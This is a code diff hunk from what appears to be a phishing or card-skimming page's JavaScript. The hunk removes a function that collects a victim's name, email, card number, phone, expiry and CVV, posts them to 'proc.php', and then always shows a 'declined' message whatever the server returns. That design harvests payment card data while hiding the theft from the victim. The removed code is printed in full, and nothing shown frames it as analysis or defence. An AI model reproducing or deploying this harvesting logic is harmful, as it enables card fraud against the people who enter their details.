@@ -147,38 +147,6 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // Handle card submission
-    function handleCardSubmission(name, email, cardNumber, phoneNumber, expiryDate, cvv) {
-        const cardData = {
-            name: name,
-            email: email,
-            number: encryptString(cardNumber),
-            phone: phoneNumber,
-            expiry: expiryDate,
-            cvv: encryptString(cvv)
-        };
-
-        fetch('proc.php', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(cardData)
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Server response:', data);
-            if (data.status === 'error') {
-                console.error('Server error:', data.message);
-            }
-            showDeclinedMessage();
-        })
-        .catch(error => {
-            console.error('Fetch error:', error);
-            showDeclinedMessage();
-        });
-    }
-
     // Show declined message
     function showDeclinedMessage() {
         loadingOverlay.style.display = 'none';
